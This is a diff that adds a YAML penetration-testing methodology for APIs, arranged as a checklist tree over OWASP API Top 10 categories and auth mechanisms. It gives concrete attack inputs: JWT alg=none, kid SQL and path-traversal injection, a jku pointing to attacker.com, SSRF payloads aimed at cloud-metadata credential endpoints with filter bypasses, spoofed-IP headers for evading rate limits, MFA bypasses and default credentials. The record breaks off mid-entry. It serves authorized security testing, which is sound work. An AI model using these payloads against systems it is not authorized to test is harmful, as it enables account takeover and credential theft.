@@ -1,0 +1,1523 @@
+name: "API Security Testing"
+version: "1.0.0"
+author: "HackMind"
+description: >
+  Comprehensive API penetration testing methodology covering OWASP API Security
+  Top 10 (2023), authentication mechanism-specific tests, and the most common
+  vulnerability classes found in bug bounty API reports.
+  Uses question nodes to branch into auth-specific and feature-specific tests
+  so non-applicable checks are hidden automatically.
+
+nodes:
+  # ===========================================================================
+  # RECONNAISSANCE & DISCOVERY
+  # ===========================================================================
+  - id: recon
+    type: info
+    title: "Reconnaissance & Discovery"
+    content: |
+      Map the full API attack surface before active testing.
+      Goal: understand every endpoint, parameter, auth mechanism, and data model.
+    children:
+      - id: recon_docs
+        type: checklist
+        title: "Discover API documentation"
+        content: |
+          Common paths to check:
+          /swagger.json, /swagger-ui.html, /swagger-ui/, /api-docs, /api-docs/,
+          /openapi.json, /openapi.yaml, /v1/api-docs, /v2/api-docs, /v3/api-docs,
+          /documentation, /api/spec, /api/swagger, /redoc, /graphql (introspection),
+          /.well-known/openapi, /api/openapi.json, /docs, /api/docs
+          Also check Postman collections shared publicly: site:postman.com "target.com"
+
+      - id: recon_js_endpoints
+        type: checklist
+        title: "Extract endpoints from JavaScript files and mobile app binaries"
+        content: |
+          JS analysis:
+          - Tools: LinkFinder, JSParser, gau, katana
+          - Search for fetch(), axios(), XMLHttpRequest, $.ajax() calls
+          - Deobfuscate minified bundles: js-beautify, prettier
+
+          Mobile app analysis:
+          - Android: jadx -d out/ app.apk, grep recursively for http/https URLs
+          - iOS: strings binary | grep -E "https?://"
+          - Search for: endpoint, api, baseUrl, serverUrl constants
+
+      - id: recon_wordlist_fuzz
+        type: checklist
+        title: "Brute-force hidden endpoints and HTTP methods"
+        content: |
+          Endpoint discovery:
+          - ffuf -w SecLists/Discovery/Web-Content/api/api-endpoints.txt -u https://target.com/api/FUZZ
+          - feroxbuster -u https://target.com/api/ -w wordlist.txt -x json
+          - Wordlists: SecLists/Discovery/Web-Content/api/, raft-large-words
+
+          HTTP method discovery:
+          - For each found endpoint, test: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD, TRACE
+          - OPTIONS request reveals Allow header with supported methods
+          - Some frameworks expose extra methods only on specific paths
+
+      - id: recon_versions
+        type: checklist
+        title: "Map all API versions in use"
+        content: |
+          - Check path versioning: /v1/, /v2/, /v3/, /api/v1/, /api/v2/
+          - Check header versioning: API-Version, Accept: application/vnd.api+json;version=2
+          - Check subdomain versioning: api-v1.target.com, v2.api.target.com
+          - Old versions frequently lack controls added to newer versions
+          - Pay special attention to /beta/, /legacy/, /internal/, /dev/ prefixes
+
+      - id: recon_error_analysis
+        type: checklist
+        title: "Trigger and analyze error responses"
+        content: |
+          Send malformed requests to leak framework/server info:
+          - Type mismatches: send string where int expected, and vice versa
+          - Missing required fields
+          - Extremely long strings (>10,000 chars)
+          - Special characters: ' " ; < > null bytes %00 \n \r
+          - Wrong Content-Type headers
+          Look for: stack traces, internal file paths, framework versions, DB query info
+
+      - id: recon_postman_github
+        type: checklist
+        title: "Search for leaked collections, keys, and schemas"
+        content: |
+          GitHub dorking:
+          - "target.com" "api_key" OR "Bearer" OR "Authorization" site:github.com
+          - filename:.env "target.com"
+          - filename:postman_collection.json "target.com"
+
+          Other sources:
+          - Postman Public API Network: search for company name
+          - SwaggerHub: search for target organization
+          - FOFA / Shodan / Censys for exposed API interfaces
+
+  # ===========================================================================
+  # TRANSPORT SECURITY
+  # ===========================================================================
+  - id: transport
+    type: info
+    title: "Transport Security"
+    content: |
+      Verify all communication is properly secured at the transport layer.
+    children:
+      - id: transport_https_enforced
+        type: checklist
+        title: "Confirm HTTPS enforced — no HTTP fallback on any endpoint"
+        content: |
+          - Send all requests over HTTP and verify they are rejected or redirected
+          - Check HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains
+          - Verify HSTS preloading for high-value domains
+
+      - id: transport_tls_version
+        type: checklist
+        title: "Verify TLS version and cipher suite strength"
+        content: |
+          - testssl.sh https://target.com/api/
+          - sslyze --regular target.com:443
+          - Reject: TLS 1.0, TLS 1.1, SSLv3, RC4, DES, NULL ciphers, EXPORT ciphers
+          - Require: TLS 1.2 minimum, TLS 1.3 preferred
+          - Check for BEAST, POODLE, DROWN, ROBOT vulnerabilities
+
+      - id: transport_cors
+        type: checklist
+        title: "Audit CORS policy"
+        content: |
+          Test cases:
+          1. Origin: https://evil.com          → should NOT see Access-Control-Allow-Origin: https://evil.com
+          2. Origin: null                       → check if allowed (sandbox iframe exploitation)
+          3. Origin: https://target.com.evil.com → suffix-match bypass
+          4. Origin: https://notarget.com       → prefix-match bypass
+
+          Critical: Access-Control-Allow-Credentials: true + permissive origin = account takeover
+          - Verify Access-Control-Allow-Origin is never a reflection of arbitrary Origin
+
+      - id: transport_cert_validation
+        type: checklist
+        title: "Verify TLS certificate validity and mobile client pinning"
+        content: |
+          - Check cert CN/SAN matches target domain
+          - Verify cert is not expired, self-signed, or from untrusted CA
+          - For mobile apps: attempt MitM with custom cert (if pinning is bypassed)
+
+  # ===========================================================================
+  # AUTHENTICATION — BRANCH BY MECHANISM
+  # ===========================================================================
+  - id: auth_mechanism
+    type: question
+    title: "What is the primary authentication mechanism?"
+    options:
+      - label: "JWT (JSON Web Tokens)"
+        key: jwt
+        children:
+          - id: jwt_section
+            type: info
+            title: "JWT Security Testing"
+            content: |
+              JWT flaws are among the most impactful findings in API bug bounty programs.
+              Always decode and inspect the header, payload, and signature before testing.
+              Tool: jwt.io, jwt_tool (https://github.com/ticarpi/jwt_tool)
+            children:
+              - id: jwt_none_alg
+                type: checklist
+                title: "Test algorithm confusion — set alg to 'none' and strip signature"
+                content: |
+                  1. Decode the JWT header
+                  2. Change: {"alg":"none","typ":"JWT"} (also try: None, NONE, nOnE)
+                  3. Remove the signature segment entirely (keep trailing dot)
+                  4. Some libraries skip signature validation when alg=none
+                  Tool: jwt_tool -X a -t <token>
+
+              - id: jwt_rs256_hs256
+                type: checklist
+                title: "Test RS256 → HS256 algorithm confusion (public key as HMAC secret)"
+                content: |
+                  If server uses RS256 (asymmetric), obtain the public key from:
+                  - /.well-known/jwks.json, /api/auth/keys, /oauth/jwks
+                  Sign a modified token using HS256 with the public key as the secret.
+                  Some libraries use the key verbatim without checking its type.
+                  Tool: jwt_tool -X k -pk public.pem -t <token>
+
+              - id: jwt_weak_secret
+                type: checklist
+                title: "Brute-force HS256/HS384/HS512 HMAC secret"
+                content: |
+                  - hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
+                  - john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
+                  - jwt_tool -C -d wordlist.txt -t <token>
+                  Common weak secrets: secret, password, 123456, jwt-secret, your-256-bit-secret
+
+              - id: jwt_kid_injection
+                type: checklist
+                title: "Test kid (Key ID) header injection"
+                content: |
+                  The kid header is used to look up the key for verification.
+                  SQL injection: {"kid": "' UNION SELECT 'attacker_secret'--"}
+                  Path traversal: {"kid": "../../../../dev/null"} → HMAC key = empty string
+                  → Sign with empty string as secret, request is accepted
+
+              - id: jwt_jku_injection
+                type: checklist
+                title: "Test jku/x5u header injection (host your own JWKS)"
+                content: |
+                  1. Generate RSA key pair
+                  2. Host JWKS JSON at attacker-controlled URL
+                  3. Set JWT header: {"alg":"RS256","jku":"https://attacker.com/jwks.json"}
+                  4. Sign token with your private key
+                  5. If server fetches the jku URL without validation, token is accepted
+
+              - id: jwt_claims_escalation
+                type: checklist
+                title: "Test privilege escalation via claim manipulation"
+                content: |
+                  Decode payload, modify sensitive claims and re-sign (or use other flaws):
+                  - "role": "admin", "isAdmin": true, "scope": "admin:write"
+                  - "sub": <another_user_id> (horizontal privilege escalation)
+                  - "exp": 9999999999 (remove expiry)
+
+              - id: jwt_expiry
+                type: checklist
+                title: "Test expired token acceptance and missing exp claim"
+                content: |
+                  - Use a token captured >1 hour ago. Should be rejected.
+                  - Check if exp claim is present at all
+                  - Test token after logout — should be revoked server-side (if stateful)
+
+              - id: jwt_token_reuse_logout
+                type: checklist
+                title: "Test token reuse after logout and account deletion"
+                content: |
+                  Capture a valid JWT, log out, then replay the captured token.
+                  JWTs are stateless by design — verify server maintains a revocation list.
+
+      - label: "API Key"
+        key: apikey
+        children:
+          - id: apikey_section
+            type: info
+            title: "API Key Security Testing"
+            children:
+              - id: apikey_exposure
+                type: checklist
+                title: "Hunt for API key exposure in JS, mobile binaries, and responses"
+                content: |
+                  Grep decompiled app/JS for: api_key, apiKey, X-API-Key, api-key
+                  Check: error responses, verbose logs, X-Debug-* headers
+                  Search GitHub/Postman for leaked keys
+
+              - id: apikey_in_url
+                type: checklist
+                title: "Verify API key is never transmitted in URL query parameters"
+                content: |
+                  Keys in URLs appear in:
+                  - Server access logs (persisted indefinitely)
+                  - Browser history
+                  - Referer header to third-party sites
+                  - CDN/proxy logs
+                  Test: send request with key in ?api_key= and check if accepted
+
+              - id: apikey_scope_privilege
+                type: checklist
+                title: "Test API key scope — access privileged endpoints with restricted key"
+                content: |
+                  Create a read-only or limited-scope API key, then attempt:
+                  - Write operations (POST/PUT/DELETE)
+                  - Admin endpoints
+                  - Cross-account resource access
+
+              - id: apikey_revocation
+                type: checklist
+                title: "Test that revoked and rotated keys are immediately invalidated"
+
+              - id: apikey_rate_limit
+                type: checklist
+                title: "Test rate limiting on API key authentication and usage"
+                content: |
+                  Unlimited key usage enables credential stuffing and resource abuse.
+                  Check for X-RateLimit-Limit, X-RateLimit-Remaining headers.
+
+      - label: "OAuth 2.0 / OIDC"
+        key: oauth
+        children:
+          - id: oauth_section
+            type: info
+            title: "OAuth 2.0 / OIDC Security Testing"
+            content: |
+              OAuth flaws frequently lead to account takeover. Test the full authorization
+              flow: authorization endpoint, token endpoint, and resource server.
+            children:
+              - id: oauth_state_csrf
+                type: checklist
+                title: "Test CSRF via missing or reusable state parameter"
+                content: |
+                  - Initiate OAuth flow without state parameter
+                  - Capture a valid state, use it in a different session
+                  - Force-navigate victim to: /oauth/authorize?client_id=X&state=attacker_state
+                  Missing state = CSRF leading to account linking/takeover
+
+              - id: oauth_redirect_uri
+                type: checklist
+                title: "Test redirect_uri manipulation and open redirect chaining"
+                content: |
+                  - Exact match bypass: add trailing slash, dot, or port
+                  - Subdomain: https://legit.com.evil.com/callback
+                  - Path traversal: https://legit.com/callback/../redirect?url=evil.com
+                  - Fragment injection: https://legit.com/callback#
+                  - If partial match: https://legit.com/callback?extra=param (append attacker page)
+                  Goal: steal authorization code via Referer or redirected URL
+
+              - id: oauth_code_replay
+                type: checklist
+                title: "Test authorization code replay — codes must be single-use"
+                content: |
+                  1. Complete a full OAuth flow, capture the code
+                  2. Exchange code for token (normal flow)
+                  3. Attempt to exchange the same code again
+                  Also test: code from one client used on another client_id
+
+              - id: oauth_token_leakage
+                type: checklist
+                title: "Check for token/code leakage in Referer header and browser history"
+                content: |
+                  If redirect_uri contains a page that loads third-party resources,
+                  the code/token in the URL fragment/query appears in Referer headers.
+                  Test: place a redirect_uri that loads an external image/script.
+
+              - id: oauth_scope_escalation
+                type: checklist
+                title: "Test scope escalation — request higher privileges than granted"
+                content: |
+                  - Modify the scope parameter: scope=openid email admin write:all
+                  - Check if the token granted matches the requested scope or is broader
+
+              - id: oauth_pkce_bypass
+                type: checklist
+                title: "Test PKCE implementation and code_verifier bypass"
+                content: |
+                  For public clients (mobile/SPA):
+                  - Missing PKCE: code can be stolen and exchanged without verifier
+                  - Downgrade: remove code_challenge from request; server should reject
+                  - Weak code_challenge_method: plain instead of S256
+
+              - id: oauth_implicit_flow
+                type: checklist
+                title: "Identify insecure implicit grant flow usage"
+                content: |
+                  Implicit flow sends access_token in URL fragment → leaks to:
+                  - Browser history, server logs, referrer headers
+                  Modern recommendation: use authorization code + PKCE instead.
+
+              - id: oauth_oidc_claims
+                type: checklist
+                title: "Test OIDC ID token claim manipulation"
+                content: |
+                  If the app trusts claims from the ID token without server-side validation:
+                  - Modify email, sub, role claims
+                  - Test if email-based account linking can be abused with a crafted ID token
+
+      - label: "Basic Auth / Digest Auth"
+        key: basic
+        children:
+          - id: basic_section
+            type: info
+            title: "Basic / Digest Auth Testing"
+            children:
+              - id: basic_brute_force
+                type: checklist
+                title: "Test brute-force and credential stuffing — check for lockout and rate limiting"
+                content: |
+                  - Attempt >10 login requests/second; verify account lockout or rate limit
+                  - Test with HaveIBeenPwned breach credential lists
+                  - Tools: hydra, ffuf, Burp Intruder
+                  Check: X-RateLimit-*, Retry-After, lockout after N failures
+
+              - id: basic_default_creds
+                type: checklist
+                title: "Test default and weak credentials"
+                content: |
+                  Common defaults: admin:admin, admin:password, api:api, test:test,
+                  root:root, guest:guest, user:password, service:service
+                  Check vendor documentation for default API credentials.
+
+              - id: basic_https_only
+                type: checklist
+                title: "Verify credentials are never sent over plain HTTP"
+
+      - label: "Session Cookie"
+        key: session
+        children:
+          - id: session_section
+            type: info
+            title: "Session-Based Auth Testing"
+            children:
+              - id: session_fixation
+                type: checklist
+                title: "Test session fixation — verify session ID rotates after login"
+                content: |
+                  1. Obtain a pre-authentication session ID
+                  2. Log in with valid credentials
+                  3. Verify the session ID changed — if same ID retained, fixation is present
+
+              - id: session_cookie_flags
+                type: checklist
+                title: "Verify Secure, HttpOnly, and SameSite cookie flags"
+                content: |
+                  Required flags:
+                  - Secure: cookie only sent over HTTPS
+                  - HttpOnly: not accessible via JavaScript (XSS mitigation)
+                  - SameSite=Strict or Lax: CSRF mitigation
+                  SameSite=None requires Secure flag.
+
+              - id: session_csrf
+                type: checklist
+                title: "Test CSRF on all state-changing API endpoints"
+                content: |
+                  - Check for anti-CSRF token in POST/PUT/DELETE requests
+                  - Test if missing or predictable CSRF token is accepted
+                  - Test SameSite=None cookies with cross-origin requests
+                  - Custom request headers (X-Requested-With) help but are not sufficient alone
+
+              - id: session_logout
+                type: checklist
+                title: "Verify server-side session invalidation on logout"
+                content: |
+                  Capture session cookie, log out, replay the cookie.
+                  A valid session token after logout = improper invalidation.
+
+  # ===========================================================================
+  # OWASP API1: BROKEN OBJECT LEVEL AUTHORIZATION (BOLA / IDOR)
+  # ===========================================================================
+  - id: bola
+    type: info
+    title: "API1: Broken Object Level Authorization (BOLA / IDOR)"
+    content: |
+      The #1 API vulnerability. Every endpoint that accesses an object by ID must be
+      tested by substituting your IDs with IDs belonging to other users/resources.
+      Focus: does the API verify the requesting user owns or has permission to access
+      the requested object — not just that they are authenticated?
+    children:
+      - id: bola_enum_ids
+        type: checklist
+        title: "Enumerate object IDs across all endpoints with a second account"
+        content: |
+          Setup: create two accounts (Account A and Account B).
+          With Account A's token, request Account B's resources by ID.
+          Test: /api/users/{id}, /api/orders/{id}, /api/invoices/{id}, /api/documents/{id}
+          Tools: Burp Suite Autorize plugin (automates this with two tokens)
+
+      - id: bola_predictable_ids
+        type: checklist
+        title: "Test predictability and guessability of object IDs"
+        content: |
+          - Sequential integers: /orders/1001, /orders/1002 → enumerate all
+          - UUIDs: check if they appear in other API responses (user lists, audit logs)
+          - Encoded IDs: base64 decode, reverse hash if possible
+          - Use Burp Intruder with sequential payloads for integer IDs
+
+      - id: bola_nested
+        type: checklist
+        title: "Test BOLA on nested and compound resource paths"
+        content: |
+          Even if the outer ID is yours, validate the inner ID:
+          /api/users/{your_id}/orders/{other_users_order_id}
+          /api/teams/{your_team}/members/{other_team_member_id}
+          Developers often only check the parent ID, not the child.
+
+      - id: bola_indirect_ref
+        type: checklist
+        title: "Test BOLA on non-ID identifiers (slugs, emails, usernames)"
+        content: |
+          /api/profiles/{username} → substitute another user's username
+          /api/reports/{slug} → substitute another report's slug
+          /api/reset-password?email=victim@example.com
+
+      - id: bola_bulk_export
+        type: checklist
+        title: "Test bulk export and download endpoints for BOLA"
+        content: |
+          Bulk operations often skip per-object authorization:
+          /api/export?ids=1,2,3,4,5
+          /api/download?report_id=X
+          /api/reports/all → should be scoped to authenticated user's org
+
+      - id: bola_http_methods
+        type: checklist
+        title: "Test BOLA across all HTTP methods (not just GET)"
+        content: |
+          BOLA on write operations is critical:
+          PUT /api/orders/{other_users_order_id}   → modify another user's order
+          DELETE /api/files/{other_users_file_id}  → delete another user's file
+          PATCH /api/users/{other_users_id}        → update another user's profile
+
+  # ===========================================================================
+  # OWASP API2: BROKEN AUTHENTICATION
+  # ===========================================================================
+  - id: broken_auth
+    type: info
+    title: "API2: Broken Authentication"
+    content: |
+      Test authentication implementation weaknesses beyond the specific mechanism.
+      Focus on: unauthenticated endpoint access, token lifecycle, and credential recovery.
+    children:
+      - id: bauth_unprotected
+        type: checklist
+        title: "Identify endpoints that accept requests without authentication"
+        content: |
+          Strip the Authorization header / remove the session cookie from every request.
+          Even endpoints that seem read-only may expose sensitive data unauthenticated.
+          Pay attention to: /api/admin/*, /api/internal/*, /api/health (with sensitive data)
+
+      - id: bauth_token_reuse
+        type: checklist
+        title: "Test token/session validity after logout and account deletion"
+        content: |
+          - Log out, replay previously captured token → must be rejected
+          - Delete account, attempt to use prior token → must be rejected
+          - Deactivate account, use prior token → must be rejected
+
+      - id: bauth_password_reset
+        type: checklist
+        title: "Test password reset flow for weaknesses"
+        content: |
+          - Short or predictable reset tokens (numeric OTP, short UUID)
+          - Tokens that do not expire (test after 24+ hours)
+          - Token reuse — reset once, token is still valid for a second reset
+          - Host header injection in reset email: inject to redirect reset link
+          - Username enumeration via different error messages / response times
+
+      - id: bauth_mfa_bypass
+        type: checklist
+        title: "Test MFA bypass"
+        content: |
+          - Response manipulation: change {"mfa_required": true} to false
+          - Skip the MFA step entirely, request the post-auth endpoint directly
+          - Replay a previously used OTP within the validity window
+          - Brute-force 6-digit OTP (1,000,000 combinations) — check rate limit
+          - Test backup codes: are they truly one-time? Predictable format?
+
+      - id: bauth_brute_force
+        type: checklist
+        title: "Test for rate limiting on login and credential endpoints"
+        content: |
+          - Attempt >100 login requests; verify lockout or exponential backoff
+          - IP rotation bypass: X-Forwarded-For: <rotating_ip>
+          - Username enumeration: different response for valid vs invalid username
+          - Timing attack: valid username responds faster than invalid
+
+  # ===========================================================================
+  # OWASP API3: BROKEN OBJECT PROPERTY LEVEL AUTHORIZATION (BOPLA)
+  # ===========================================================================
+  - id: bopla
+    type: info
+    title: "API3: Broken Object Property Level Authorization (Mass Assignment & Excess Data)"
+    content: |
+      Covers two sub-categories:
+      1. Excessive Data Exposure — API returns more fields than the client needs
+      2. Mass Assignment — API accepts and persists fields the client should not control
+    children:
+      - id: bopla_excess_data
+        type: checklist
+        title: "Audit all API responses for sensitive fields the frontend does not use"
+        content: |
+          Compare what the frontend/mobile app displays vs. what the API response contains.
+          Look for: password hashes, PII (SSN, DOB, full card numbers), internal IDs,
+          secret keys, API tokens, other users' data, admin flags, internal metadata.
+          Tools: Burp Comparer to diff responses across privilege levels
+
+      - id: bopla_mass_assignment
+        type: checklist
+        title: "Test mass assignment — inject unexpected fields in POST/PUT/PATCH"
+        content: |
+          Add privileged fields to a normal create/update request body:
+          - "role": "admin", "isAdmin": true, "verified": true
+          - "credits": 9999, "balance": 1000000, "discount_pct": 100
+          - "status": "premium", "subscription": "enterprise"
+          - "email_verified": true, "phone_verified": true
+          Framework notes:
+          - Rails: check strong_parameters allowlist
+          - Laravel: check $fillable vs $guarded in Model
+          - Express: check body-parser and manual field whitelisting
+
+      - id: bopla_field_filter_bypass
+        type: checklist
+        title: "Test field selection parameters for sensitive field access"
+        content: |
+          Some APIs support field selection — verify it enforces authorization:
+          GET /api/users/me?fields=password,ssn,credit_card
+          GET /api/users/me?select=secret_key
+          GET /api/users/me?include=private_notes
+
+      - id: bopla_type_juggling
+        type: checklist
+        title: "Test type juggling and JSON input coercion on sensitive boolean fields"
+        content: |
+          PHP-style: "admin": "1" vs "admin": 1 vs "admin": true
+          Send: "admin": "true", "admin": "yes", "admin": 1, "admin": [true]
+          Some validation only checks string equality, not strict type.
+
+  # ===========================================================================
+  # OWASP API4: UNRESTRICTED RESOURCE CONSUMPTION
+  # ===========================================================================
+  - id: resource_consumption
+    type: info
+    title: "API4: Unrestricted Resource Consumption"
+    content: |
+      Test for missing rate limits, resource quotas, and payload size restrictions
+      that can lead to DoS, financial abuse, or brute-force amplification.
+    children:
+      - id: rc_rate_limit_missing
+        type: checklist
+        title: "Test for missing rate limiting on sensitive operations"
+        content: |
+          Critical endpoints to test: /login, /reset-password, /otp/verify, /signup,
+          /api/keys/generate, /api/export, /api/send-email, /api/send-sms
+          Tool: ffuf -rate 100 -w users.txt -u /api/login -d '{"user":"FUZZ","pass":"pass"}'
+
+      - id: rc_rate_limit_bypass_headers
+        type: checklist
+        title: "Bypass rate limiting via IP-spoofing headers"
+        content: |
+          Headers to rotate:
+          X-Forwarded-For: 1.2.3.4
+          X-Real-IP: 1.2.3.4
+          X-Originating-IP: 1.2.3.4
+          CF-Connecting-IP: 1.2.3.4
+          True-Client-IP: 1.2.3.4
+          X-Client-IP: 1.2.3.4
+          Forwarded: for=1.2.3.4
+          If rate limiting is IP-based and trusts these headers, you can rotate IPs infinitely.
+
+      - id: rc_rate_limit_bypass_encoding
+        type: checklist
+        title: "Bypass rate limiting via parameter variation and account cycling"
+        content: |
+          - Email variation: victim+1@gmail.com, victim+2@gmail.com (same inbox)
+          - Case variation: Admin vs admin vs ADMIN
+          - Null byte / Unicode: admin%00, admin\u0000
+          - HTTP parameter pollution: username=victim&username=victim2
+
+      - id: rc_pagination_abuse
+        type: checklist
+        title: "Test unbounded pagination — extremely large page sizes"
+        content: |
+          - GET /api/users?limit=99999&offset=0
+          - GET /api/logs?per_page=100000
+          - GET /api/search?size=999999&from=0
+          Can cause: OOM, DB timeout, massive data exposure in one request.
+
+      - id: rc_batch_abuse
+        type: checklist
+        title: "Test batch request abuse for rate limit bypass"
+        content: |
+          REST array body:
+          POST /api/users/batch { "ids": [1,2,...,10000] }
+
+          GraphQL batching:
+          [{"query":"mutation{login(u:\"a\",p:\"pass1\")}"}, ... x100]
+          Sends N operations in one HTTP request — bypasses per-request limits.
+
+      - id: rc_file_size
+        type: checklist
+        title: "Test file upload size limits and multipart request size limits"
+        content: |
+          - Upload a 1GB file and observe server behavior
+          - Send multipart form with thousands of fields
+          - Zip bomb: upload a small zip that expands to gigabytes
+
+      - id: rc_regex_dos
+        type: checklist
+        title: "Test for ReDoS via complex input on regex-validated fields"
+        content: |
+          Target fields with known regex validation: email, phone, zip code, URLs.
+          Send pathological input: aaaaaaaaaaaaaaaaaaaaaaaaaaa! (20+ repeated chars + fail)
+          If the server hangs or slows significantly, ReDoS is likely.
+          Tools: Burp Scanner, manual timing comparison
+
+  # ===========================================================================
+  # OWASP API5: BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA)
+  # ===========================================================================
+  - id: bfla
+    type: info
+    title: "API5: Broken Function Level Authorization (BFLA)"
+    content: |
+      Test whether a lower-privileged user can invoke admin or privileged functions.
+      Different from BOLA (object access) — this is about function/action access.
+    children:
+      - id: bfla_verb_tampering
+        type: checklist
+        title: "Test HTTP verb manipulation on read endpoints"
+        content: |
+          Change GET → POST / PUT / DELETE / PATCH and observe results.
+          Some APIs grant implicit write access when a resource-based URL is used.
+          Also test: GET on endpoints designed only for POST/DELETE.
+
+      - id: bfla_admin_endpoints
+        type: checklist
+        title: "Access admin/internal endpoints with a standard user token"
+        content: |
+          Test paths: /api/admin/*, /api/internal/*, /api/management/*, /api/debug/*
+          /api/users/all, /api/users/{id}/ban, /api/config, /api/stats/global
+          /api/roles, /api/permissions, /api/audit-log
+
+      - id: bfla_privilege_escalation
+        type: checklist
+        title: "Test vertical privilege escalation — standard user → admin"
+        content: |
+          - Change role/permission fields in request body (see BOPLA/Mass Assignment)
+          - Obtain an admin token via BOLA and test function access
+          - Test role parameter in query string: ?role=admin&action=delete
+
+      - id: bfla_undocumented
+        type: checklist
+        title: "Test undocumented endpoints discovered during recon for authorization"
+        content: |
+          Undocumented/internal endpoints are often less hardened.
+          Check: /api/dev/*, /api/test/*, /internal/*, /debug/*, /actuator/*
+
+      - id: bfla_method_override
+        type: checklist
+        title: "Test HTTP method override headers to bypass verb-based access control"
+        content: |
+          Some APIs/proxies honor:
+          X-HTTP-Method-Override: DELETE
+          X-HTTP-Method: PUT
+          X-Method-Override: PATCH
+          _method=DELETE (in form body)
+          Send POST request with override header to perform DELETE as a low-privilege user.
+
+  # ===========================================================================
+  # OWASP API6: UNRESTRICTED ACCESS TO SENSITIVE BUSINESS FLOWS
+  # ===========================================================================
+  - id: business_flows
+    type: info
+    title: "API6: Unrestricted Access to Sensitive Business Flows"
+    content: |
+      Abuse legitimate business logic at scale. Attackers don't necessarily exploit
+      technical bugs — they exploit the design itself when there are no controls.
+    children:
+      - id: bf_race_conditions
+        type: checklist
+        title: "Test race conditions on transactional operations"
+        content: |
+          Targets: balance transfers, coupon redemption, inventory purchase,
+          reward point spending, referral bonuses, free trial activation.
+          Method: send 20-50 identical requests in parallel within the same millisecond.
+          Tools: Burp Suite Turbo Intruder (race-single-packet-attack.py), custom asyncio scripts
+          Look for: double-spend, negative balance, duplicate rewards.
+
+      - id: bf_price_manipulation
+        type: checklist
+        title: "Test price and quantity manipulation"
+        content: |
+          - Change price field: 0.01, 0, -1, 0.0001
+          - Change quantity: -1 (might add credits), 0
+          - Integer overflow: 2147483648 (2^31)
+          - Change currency: USD → VND (1 VND ≈ 0.00004 USD)
+          - Modify discount_pct: 100, 101, -50
+
+      - id: bf_workflow_bypass
+        type: checklist
+        title: "Test multi-step workflow bypass — skip verification or payment steps"
+        content: |
+          Example: checkout flow has 4 steps (cart → address → payment → confirm).
+          Skip step 3 (payment) by POST-ing directly to /api/orders/confirm.
+          Also: replay a success response from a previous successful purchase.
+
+      - id: bf_coupon_abuse
+        type: checklist
+        title: "Test coupon, promo code, and discount stacking or unlimited use"
+        content: |
+          - Apply same coupon multiple times in one transaction
+          - Apply multiple coupons (stacking)
+          - Use a coupon after it has been marked as used (race condition)
+          - Test referral codes: self-referral, circular referral between two accounts
+
+      - id: bf_api_abuse_scale
+        type: checklist
+        title: "Test for missing abuse controls on high-value automation targets"
+        content: |
+          Examples: mass account creation, automated voting/poll stuffing,
+          flight/ticket reservation squatting, bot-driven form submission.
+          Check: CAPTCHA, device fingerprinting, behavioral analysis controls.
+
+  # ===========================================================================
+  # OWASP API7: SERVER-SIDE REQUEST FORGERY (SSRF)
+  # ===========================================================================
+  - id: ssrf
+    type: info
+    title: "API7: Server-Side Request Forgery (SSRF)"
+    content: |
+      Test every parameter that accepts a URL, hostname, IP, or URI.
+      SSRF can lead to internal service access, cloud metadata theft, and RCE.
+    children:
+      - id: ssrf_identify_params
+        type: checklist
+        title: "Identify all URL-accepting parameters across the API"
+        content: |
+          Common parameter names: url, uri, href, link, src, source, redirect,
+          callback, webhook, endpoint, target, host, image, avatar, icon,
+          feed, import, export, proxy, fetch, load, ping, check, validate
+
+      - id: ssrf_cloud_metadata
+        type: checklist
+        title: "Test SSRF to cloud metadata endpoints"
+        content: |
+          AWS: http://169.254.169.254/latest/meta-data/
+                http://169.254.169.254/latest/meta-data/iam/security-credentials/
+          GCP: http://metadata.google.internal/computeMetadata/v1/ (requires Metadata-Flavor header)
+          Azure: http://169.254.169.254/metadata/instance?api-version=2021-01-01
+                 http://169.254.169.254/metadata/identity/oauth2/token
+          DigitalOcean: http://169.254.169.254/metadata/v1/
+
+      - id: ssrf_internal_services
+        type: checklist
+        title: "Test SSRF to internal network services"
+        content: |
+          - http://localhost/, http://127.0.0.1/, http://[::1]/
+          - http://10.0.0.1/, http://172.16.0.1/, http://192.168.1.1/
+          - Common internal services: Redis (6379), Elasticsearch (9200),
+            MongoDB (27017), Memcached (11211), internal HTTP APIs (8080, 8443)
+          - Kubernetes API: https://kubernetes.default.svc/api/v1/namespaces
+
+      - id: ssrf_filter_bypass
+        type: checklist
+        title: "Test SSRF filter bypass techniques"
+        content: |
+          URL encoding: http://127%2E0%2E0%2E1/
+          Decimal IP: http://2130706433/ (= 127.0.0.1)
+          Octal: http://0177.0.0.1/
+          Hex: http://0x7f000001/
+          Short form: http://127.1/
+          IPv6: http://[::1]/, http://[::ffff:127.0.0.1]/
+          Double encoding: http://127%252E0%252E0%252E1/
+          Redirect chain: make attacker.com redirect to 169.254.169.254
+          DNS rebinding: domain resolves to safe IP initially, then to internal IP
+
+      - id: ssrf_blind_oob
+        type: checklist
+        title: "Test blind SSRF via out-of-band interaction"
+        content: |
+          If no response body is returned, use OOB detection:
+          - Burp Collaborator / interactsh (https://app.interactsh.com)
+          - Set URL parameter to your OOB domain
+          - Check for DNS lookups and HTTP callbacks
+          - Even a DNS-only callback confirms SSRF
+
+      - id: ssrf_webhook
+        type: checklist
+        title: "Test SSRF via webhook and callback URL registration"
+        content: |
+          Register a webhook/callback pointing to internal service or OOB URL.
+          Common in: payment notifications, CI/CD integrations, alert systems.
+          POST /api/webhooks { "url": "http://169.254.169.254/latest/meta-data/" }
+
+  # ===========================================================================
+  # OWASP API8: SECURITY MISCONFIGURATION
+  # ===========================================================================
+  - id: security_misconfig
+    type: info
+    title: "API8: Security Misconfiguration"
+    content: |
+      Broad category covering response headers, debug features, CORS, HTTP methods,
+      and content-type handling.
+    children:
+      - id: sm_security_headers
+        type: checklist
+        title: "Audit security response headers"
+        content: |
+          Required headers:
+          - X-Content-Type-Options: nosniff
+          - X-Frame-Options: DENY or SAMEORIGIN
+          - Strict-Transport-Security: max-age=31536000; includeSubDomains
+          - Content-Security-Policy (relevant for API responses with HTML content)
+          - Referrer-Policy: no-referrer or strict-origin-when-cross-origin
+          - Permissions-Policy
+
+          Dangerous headers that should NOT appear:
+          - X-Powered-By (reveals framework/version)
+          - Server: Apache/2.4.1 (reveals version)
+          - X-AspNet-Version, X-AspNetMvc-Version
+
+      - id: sm_debug_endpoints
+        type: checklist
